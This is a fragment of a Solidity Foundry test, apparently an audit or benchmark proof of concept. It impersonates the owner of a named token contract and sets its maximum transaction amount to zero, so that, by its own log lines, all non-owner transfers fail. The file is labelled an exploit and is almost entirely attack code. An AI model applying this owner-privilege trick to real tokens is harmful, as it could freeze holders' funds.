    function setMaxTxPercent(uint256 maxTxPercent) external;
    function _maxTxAmount() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xCd092F1f9858204d7986b3a2e36730fF1229a2e5;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get the owner dynamically in the exploit
        vm.label(TARGET, "LegendsDoge Token");

        // Create a test user to demonstrate transfer failure
        vm.label(address(0x1234), "Test User");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, get the current owner of the contract
        ILegendsDoge target = ILegendsDoge(TARGET);
        address owner = target.owner();
        vm.label(owner, "Contract Owner");

        console.log("Current owner:", owner);
        console.log("Initial _maxTxAmount:", target._maxTxAmount());

        // Impersonate the owner and set maxTxPercent to 0
        vm.prank(owner);
        target.setMaxTxPercent(0);

        // Verify the exploit worked
        uint256 newMaxTxAmount = target._maxTxAmount();
        console.log("New _maxTxAmount:", newMaxTxAmount);

        // Assert that _maxTxAmount is now 0 (oracle verification)
        assertEq(newMaxTxAmount, 0, "_maxTxAmount should be 0 after exploit");

        // Optional: Log success without attempting transfers
        console.log("Exploit successful: _maxTxAmount set to 0");
        console.log("All non-owner transfers will now fail due to require(amount <= _maxTxAmount)");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

